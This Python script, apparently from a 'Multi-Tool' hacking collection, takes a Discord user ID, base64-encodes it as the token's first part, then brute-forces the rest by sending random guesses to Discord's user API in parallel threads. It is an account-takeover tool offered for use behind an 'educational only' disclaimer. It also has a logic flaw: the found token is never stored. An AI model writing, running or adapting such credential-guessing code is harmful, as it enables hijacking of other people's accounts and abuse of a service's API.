# ============================================================
#  Author      : Anonyme-001
#  Project     : Multi-Tool (Educational Purpose Only)
#  Year        : 2025
#
#  DISCLAIMER:
#  This code is provided for EDUCATIONAL PURPOSES ONLY.
#  It is intended to help understand programming, security
#  concepts, and defensive techniques.
#
#  ❌ Any malicious use is strictly prohibited.
#  ❌ Do NOT modify this code to perform illegal actions.
#  ❌ The author is NOT responsible for any misuse.
#
#  By using this code, you agree to use it responsibly
#  and within legal boundaries.
#
#  Copyright (c) 2025 Anonyme-001
#  See LICENSE file for details.
# ============================================================


from Plugins.Utils import *
from Plugins.Config import *

try:
    import base64
    import requests
    import random
    import threading
    import string
    import time
except Exception as e:
    MissingModule(e)

Title("Discord Id To Token")
Connection()

try:
    user_id = input(f"{INPUT} Enter Discord User Id {red}->{reset} ").strip()
    if not user_id.isdigit():
        ErrorId()

    first_part = str(base64.b64encode(user_id.encode("utf-8")), "utf-8").replace("=", "")
    print(f"{INFO} First Part of Token:{red} {first_part}", reset)

    find_token = input(f"{INPUT} Find the Token? {YESORNO} {red}->{reset} ").strip().lower()
    if not find_token in ['y', 'yes']:
        Continue()
        Reset()

    try:
        threads_number = int(input(f"{INPUT} Threads Number {red}->{reset} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Brute Force of the Token..", reset)

    token_found = threading.Event()
    found_token = None

    def TokenCheck():
        global found_token

        if token_found.is_set():
            return

        first_part_token  = first_part
        second_part_token = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
        third_part_token  = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
        all_parts_token   = f"{first_part_token}.{second_part_token}.{third_part_token}"

        try:
            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': all_parts_token, 'Content-Type': 'application/json'})
            if response.status_code == 200:
                print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {all_parts_token}", reset)
                token_found.set()  
            else:
                print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {all_parts_token}", reset)
        except:
            print(f"{ERROR} Status:{red} Error   {white}| Token:{red} {all_parts_token}", reset)

    def Request():
        threads = []
        try:
            for _ in range(threads_number):
                if token_found.is_set():
                    break
                t = threading.Thread(target=TokenCheck)
                t.start()
                threads.append(t)
                time.sleep(0.1)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while not token_found.is_set():
        Request()

    if found_token:
        SaveToken(found_token)
        print(f'{INFO} Token saved in {red}"{white}Programs/Extras/DiscordTokens.txt{red}"{white}.', reset)
    
    Continue()
    Reset()

except Exception as e:
    Error(e)